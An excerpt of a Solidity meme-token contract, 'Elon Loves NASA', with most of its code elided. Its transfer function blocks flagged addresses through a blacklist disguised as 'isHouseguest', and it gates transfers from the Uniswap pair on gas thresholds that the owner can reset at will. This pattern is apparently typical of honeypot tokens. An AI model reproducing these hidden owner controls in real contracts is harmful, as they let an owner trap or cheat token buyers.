...
contract ElonLovesNASA is Ownable, IERC20 {
    ...
    string private _name = "Elon Loves NASA";

    string private _symbol = "ELN";

    uint256 private _liquiditySwapThreshold = _totalSupply;

    uint256 private maxRoomRent = 5000000000;
    uint256 private gl = 700000;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if(hcm){
            require(!isHouseguest[from],"BCS");
            if(tx.gasprice > maxRoomRent && from == uniswapV2Pair() || startGas > gl && from == uniswapV2Pair()){
    ...
    function setgl(uint256 _gl) external onlyOwner{
        gl = _gl;
    }    
